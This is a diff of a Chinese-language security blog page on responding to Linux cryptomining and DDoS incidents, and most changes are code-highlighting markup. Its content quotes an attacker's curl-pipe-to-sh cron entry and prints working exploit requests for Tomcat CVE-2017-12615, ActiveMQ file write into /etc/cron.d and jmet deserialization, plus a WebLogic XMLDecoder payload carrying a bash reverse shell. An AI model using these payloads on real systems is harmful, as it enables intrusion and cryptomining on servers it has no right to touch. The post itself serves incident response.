@@ -94,7 +94,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="爆破,linux,应急响应,命令执行,Redis,反序列化,Memcache,Weblogic,ActiveMQ,Tomcat,Kubernetes,RMI,Docker,Struts2,未授权访问," />
+  <meta name="keywords" content="爆破,命令执行,linux,应急响应,反序列化,Redis,Memcache,Weblogic,ActiveMQ,Tomcat,Kubernetes,RMI,Docker,Struts2,未授权访问," />
 
 
 
@@ -113,7 +113,7 @@
 
 
 <meta name="description" content="前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找  木马病毒">
-<meta name="keywords" content="爆破,linux,应急响应,命令执行,Redis,反序列化,Memcache,Weblogic,ActiveMQ,Tomcat,Kubernetes,RMI,Docker,Struts2,未授权访问">
+<meta name="keywords" content="爆破,命令执行,linux,应急响应,反序列化,Redis,Memcache,Weblogic,ActiveMQ,Tomcat,Kubernetes,RMI,Docker,Struts2,未授权访问">
 <meta property="og:type" content="article">
 <meta property="og:title" content="关于Linux挖矿、DDOS等应急事件处置方法">
 <meta property="og:url" content="http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/index.html">
@@ -494,7 +494,7 @@
 <li><p>redis未授权访问</p>
 <p>redis未授权访问主要被用来进行挖矿，一般手段是通过redis写入计划任务，基本上都是形如：<code>/bin/sh -c /usr/bin/curl -sL https://lnk0.com/VhscA1|sh</code>，直接进行挖矿、ddos等。</p>
 <p><strong>排查方法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h host -p port</div></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h host -<span class="selector-tag">p</span> port</div></pre></td></tr></table></figure>
 <p><img src="http://blog.w2n1ck.com/redis-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
@@ -505,7 +505,7 @@
 <li><p>memcache未授权访问</p>
 <p>memcache未授权访问主要被用来进行DDoS，在今年三月份爆发，攻击者利用memcached协议，发送大量带有被害者IP地址的UDP数据包给放大器主机，然后放大器主机对伪造的IP地址源做出大量回应，形成分布式拒绝服务攻击，从而形成DRDoS反射。</p>
 <p><strong>排查方法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc host port</div></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">nc host port</span></div></pre></td></tr></table></figure>
 <p><img src="http://blog.w2n1ck.com/memcache-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
@@ -517,7 +517,7 @@
 <li><p>docker未授权访问</p>
 <p>docker未授权访问主要被用来进行挖矿，通过挂载宿主机的<code>/etc/</code>、<code>/var/spool/cron/</code>等目录，之后将相关挖矿的脚本、命令等写入到<code>/etc/crontab</code>，<code>/var/spool/cron/crontabs/root</code>中。</p>
 <p><strong>排查方法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://IP:2375/containers/json</div></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http:<span class="regexp">//</span>IP:<span class="number">2375</span><span class="regexp">/containers/</span>json</div></pre></td></tr></table></figure>
 <p><img src="http://blog.w2n1ck.com/docker-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
@@ -528,7 +528,7 @@
 <li><p>k8s未授权访问</p>
 <p>k8s未授权访问主要被用来挖矿，API Server 默认会开启两个端口：8080和 6443。其中 8080 端口无需认证，6443 端口需要认证，且有 TLS 保护，直接访问8080端口会返回可用的API列表。访问dashboard 页面，可以创建、修改、删除容器，查看日志等。攻击者利用的流程大体为：<code>创建新的容器 -&gt; 挂载宿主机目录 -&gt; 写 /etc/crontab</code>定时任务进行挖矿。</p>
 <p><strong>排查方法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://IP:8080/</div></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">http:</span><span class="comment">//IP:8080/</span></div></pre></td></tr></table></figure>
 <p><img src="http://blog.w2n1ck.com/k8s-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
@@ -542,7 +542,7 @@
 <li><p>Tomcat PUT任意文件写入漏洞（CVE-2017-12615）</p>
 <p><strong>排查方法：</strong></p>
 <p>直接发送以下数据包即可在Web根目录写入shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PUT /test.jsp/ HTTP/1.1</div><div class="line">Host: ip:port</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 4</div><div class="line"></div><div class="line">test</div></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUT</span> <span class="string">/test.jsp/</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: ip:port</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: en</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"><span class="attribute">Content-Length</span>: 4</div><div class="line"></div><div class="line"><span class="attribute">test</span></div></pre></td></tr></table></figure>
 </li>
 <li><p>Tomcat弱口令部署war包getshell</p>
 <p><strong>排查方法：</strong></p>
@@ -562,16 +562,16 @@
 <p>默认开启61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。攻击者利用的流程为：<code>构造可执行命令的序列化对象 -&gt; 作为一个消息，发送给目标61616端口 -&gt;访问web管理页面，读取消息，触发漏洞</code></p>
 <p><strong>排查方法：</strong></p>
 <p>下载jmet的jar文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/activemq&quot; -Yp ROME IP 61616</div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/activemq"</span> -Yp ROME<span class="built_in"> IP </span>61616</div></pre></td></tr></table></figure>
 <p>访问：<code>http://ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息</p>
 <p>点击查看这条消息即可触发命令执行</p>
 </li>
 <li><p>ActiveMQ fileserver任意文件写入漏洞（CVE-2016-3088）</p>
 <p>ActiveMQ的web控制台8161端口分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api需要登录后才能使用，fileserver无需登录。目前见到的是直接写入cron挖矿，简单粗暴！</p>
 <p><strong>排查方法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PUT /fileserver/test.txt HTTP/1.1</div><div class="line">Host: ip:8161</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Length: 4</div><div class="line"></div><div class="line">test</div></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/test.txt</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: ip:8161</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: en</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">Content-Length</span>: 4</div><div class="line"></div><div class="line"><span class="attribute">test</span></div></pre></td></tr></table></figure>
 <p>写入到计划任务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">MOVE /fileserver/text.txt HTTP/1.1</div><div class="line">Destination: file:///etc/cron.d/root</div><div class="line">Host: ip:8161</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Length: 0</div></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/text.txt</span> HTTP/1.1</div><div class="line"><span class="attribute">Destination</span>: file:///etc/cron.d/root</div><div class="line"><span class="attribute">Host</span>: ip:8161</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: en</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">Content-Length</span>: 0</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><strong>修复方法：</strong></p>
@@ -614,7 +614,7 @@
 </blockquote>
 <p><strong>排查方法：</strong></p>
 <p>发送如下数据包，注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: IP:7001</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 633</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</div><div class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">&lt;void index=&quot;0&quot;&gt;</div><div class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;void index=&quot;1&quot;&gt;</div><div class="line">&lt;string&gt;-c&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;void index=&quot;2&quot;&gt;</div><div class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.11/8080 0&amp;gt;&amp;amp;1&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;/array&gt;</div><div class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">&lt;/java&gt;</div><div class="line">&lt;/work:WorkContext&gt;</div><div class="line">&lt;/soapenv:Header&gt;</div><div class="line">&lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: IP:7001</div><div class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: en</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">Content-Type</span>: text/xml</div><div class="line"><span class="attribute">Content-Length</span>: 633</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</div><div class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</div><div class="line">&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</div><div class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</div><div class="line">&lt;array class="java.lang.String" length="3"&gt;</div><div class="line">&lt;void index="0"&gt;</div><div class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;void index="1"&gt;</div><div class="line">&lt;string&gt;-c&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;void index="2"&gt;</div><div class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.11/8080 0&amp;gt;&amp;amp;1&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;/array&gt;</div><div class="line">&lt;void method="start"/&gt;&lt;/void&gt;</div><div class="line">&lt;/java&gt;</div><div class="line">&lt;/work:WorkContext&gt;</div><div class="line">&lt;/soapenv:Header&gt;</div><div class="line">&lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li><p>升级weblogic相关补丁到最新版本</p>
@@ -640,13 +640,13 @@
 <p><code>cat /etc/crontab</code> ： 查看<code>/etc/crontab</code></p>
 <p><code>ls -al  /etc/cron.*</code> ： 查看cron文件是否变化的详细信息</p>
 <p><code>ll /var/spool/cron/</code> ： 查看<code>/var/spool/cron/</code> </p>
-<h2 id="检查系统命令"><a href="#检查系统命令" class="headerlink" title="检查系统命令"></a>检查系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ls -alt /bin/ | head -n 10</div><div class="line">ls -alt /usr/sbin/ | head -n 10</div><div class="line">ls -alt /usr/bin/ | head -n 10</div></pre></td></tr></table></figure>
+<h2 id="检查系统命令"><a href="#检查系统命令" class="headerlink" title="检查系统命令"></a>检查系统命令</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ls</span> -alt <span class="string">/bin/</span> | head -n 10</div><div class="line"><span class="keyword">ls</span> -alt <span class="string">/usr/sbin/</span> | head -n 10</div><div class="line"><span class="keyword">ls</span> -alt <span class="string">/usr/bin/</span> | head -n 10</div></pre></td></tr></table></figure>
 <h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>1、<a href="http://n.shellpub.com/" target="_blank" rel="external">河马</a></p>
 <p>2、自写脚本（推荐，因为可根据情况，自己加特征等）</p>
 <h2 id="使用杀毒软件"><a href="#使用杀毒软件" class="headerlink" title="使用杀毒软件"></a>使用杀毒软件</h2><p>ClamAV</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">扫描：clamscan -r /usr —max-dir-recursion=5 -l /tmp/clamav.log</div><div class="line"></div><div class="line">移除：clamscan -r  —remove  /usr/bin/</div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">扫描：clamscan -r /usr —<span class="attribute">max-dir-recursion</span>=5 -l /tmp/clamav.log</div><div class="line"></div><div class="line">移除：clamscan -r  —<span class="builtin-name">remove</span>  /usr/bin/</div></pre></td></tr></table></figure>
 <p>rkhunter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rkhunter --propupd</div><div class="line"></div><div class="line">rkhunter --check</div></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rkhunter <span class="comment">--propupd</span></div><div class="line"></div><div class="line">rkhunter <span class="comment">--check</span></div></pre></td></tr></table></figure>
 <h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、一定要查看系统命令是否被替换，否则所做的都是一切徒劳。。。</p>
 <p>2、若系统替换可用其他代替，如：ps使用top，netstat使用ss等</p>
 <p>3、<code>lsof -n |grep delete</code> 查找已经删除但是还在使用的文件 </p>
@@ -741,15 +741,15 @@
           
             <a href="/tags/爆破/" rel="tag"><i class="fa fa-tag"></i> 爆破</a>
           
+            <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+          
             <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
           
             <a href="/tags/应急响应/" rel="tag"><i class="fa fa-tag"></i> 应急响应</a>
           
-            <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
           
             <a href="/tags/Redis/" rel="tag"><i class="fa fa-tag"></i> Redis</a>
-          
-            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
           
             <a href="/tags/Memcache/" rel="tag"><i class="fa fa-tag"></i> Memcache</a>
           
@@ -907,7 +907,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
